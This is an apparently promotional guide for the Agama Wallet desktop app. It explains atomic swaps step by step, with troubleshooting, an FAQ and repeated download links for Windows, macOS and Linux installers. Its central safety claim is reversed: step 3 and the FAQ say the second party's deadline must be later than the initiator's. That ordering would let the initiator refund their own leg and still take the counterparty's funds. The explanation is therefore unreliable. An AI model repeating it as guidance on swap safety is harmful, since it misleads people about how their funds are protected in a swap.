[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# How Atomic Swaps Work, Step by Step

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An atomic swap runs in five moves: agree the trade, lock one leg, lock the other, reveal the secret that unlocks both, then claim. If any step stalls, time locks return each side's funds. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, described by its maker as settling through the BarterDEX protocol over hash time-locked contracts.

## You'll see this if

You have started a swap and the interface is showing a sequence you do not recognise: a lock, a countdown, then a claim.

| Step you see | Who acts | What it means |
|---|---|---|
| Order posted | You | Nothing is committed yet; the order is visible to counterparties |
| "Locked" | You | Your leg is committed to a contract with a deadline |
| "Counterparty locked" | Them | Their leg is committed on the other chain |
| "Claimed" | You, then them | The secret is revealed and the trade settles |
| Countdown reaching zero | Nobody | The refund path opens for whichever side is still locked |

## Why it happens

Two chains cannot see each other, so the trade has to be structured so that taking one leg requires revealing the key to the other. A hash time-locked contract does that with a hash and a deadline.

The full sequence, with the timing that makes it safe:

1. **Agree the terms.** Amount, pair and the hash of a secret chosen by the initiator. The counterparty never sees the secret, only its hash.
2. **The initiator locks first.** Funds go to an output that pays out to whoever reveals the secret, or back to the initiator after deadline one.
3. **The counterparty locks second, with a later deadline.** Their leg can be claimed with the same secret; their refund comes after deadline two, which is deliberately later than deadline one.
4. **The initiator claims their leg.** Claiming publishes the secret on-chain, because a claim must reveal the value that satisfies the hash.
5. **The counterparty claims with the now-public secret.** Their claim happens before their own deadline, and both legs settle.
6. **If anyone stops, the deadlines refund.** A party who never receives their leg reclaims their own once their deadline passes.

The margin between the two deadlines is the safety window: it gives the second party time to claim after the secret becomes public. Too short a margin and a slow counterparty can lose their window.

## Fix

A swap in progress is a sequence to monitor, not a button to press again.

1. **Confirm your own lock before worrying about theirs.** A wallet that has not broadcast its lock has not started the trade.
2. **Watch the counterparty's lock appear on the other chain.** Use the explorer the wallet links to, not a search engine result.
3. **Note both deadlines.** They are measured in blocks, so the wall-clock time depends on the slower chain.
4. **Claim as soon as the secret is public.** Your claim is a transaction and needs a fee available.
5. **If a deadline passes with no claim, use the refund path.** It is a transaction too, and it must be built before the output is spent by anyone else.

The maker of the wallet estimates a typical swap at 5 to 30 minutes depending on the chains and congestion, with KMD and LTC faster than BTC.

## If that did not work

If the counterparty's lock never appears, the trade never started on their side. Your refund path opens at your deadline; there is nothing else to do.

If your claim transaction fails, the usual causes are an insufficient fee, a wallet that is not synced to the tip, or a deadline that has already passed. A passed deadline does not lose the funds, it changes which path is available.

If the interface reports success but the balance is unchanged, check confirmations. A claimed output is spendable only after it confirms, and the two chains confirm at different rates.

If someone offers to "recover" a stuck swap for a fee or by moving your funds manually, that offer is not part of the mechanism. Atomic swaps settle by deadline, not by intervention, and [when a swap fails](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md) sets out what each outcome means.

## Prevention

- **Check liquidity before committing.** A thin pair means waiting, not a better price.
- **Keep a fee balance on both chains.** Locks and claims are transactions; a wallet with nothing for fees cannot complete either.
- **Do not close the wallet mid-swap.** Deadlines run whether or not the software is open.
- **Note the deadlines in block heights.** Wall-clock estimates mislead when one chain is slower.
- **Rehearse on test networks.** [Testing atomic swaps on signet and testnet](https://github.com/agama-wallet/atomic-swaps/blob/main/testing-on-signet-and-testnet.md) is the cheapest way to learn the sequence.
- **Budget for two fees, not one.** A swap is at least two transactions per side, and the cost is covered in [atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md).

## FAQ

### Who locks first, and does it matter?

The initiator locks first, and it matters: the second party's deadline is later, which gives them time to claim after the secret is revealed. Reversing the order without reversing the deadlines removes that safety window.

### What stops the counterparty taking both legs?

The secret. Claiming one leg publishes the value that unlocks the other, and the second party's deadline has not passed, so they can still claim. Taking both would require the secret without revealing it, which the contract does not allow.

### What happens if my internet drops during a swap?

The locks stay on-chain. If you return before your deadline you can still claim; after it, you reclaim your own leg. Neither outcome depends on the wallet staying open.

### How long is a swap actually?

The maker estimates 5 to 30 minutes. In practice the duration is set by block times and by how quickly each side broadcasts its next transaction, so a slow confirmation on one chain extends the whole trade.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md)
- [When an Atomic Swap Fails: Timeouts and Refunds](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md)
- [Testing Atomic Swaps on Signet and Testnet](https://github.com/agama-wallet/atomic-swaps/blob/main/testing-on-signet-and-testnet.md)
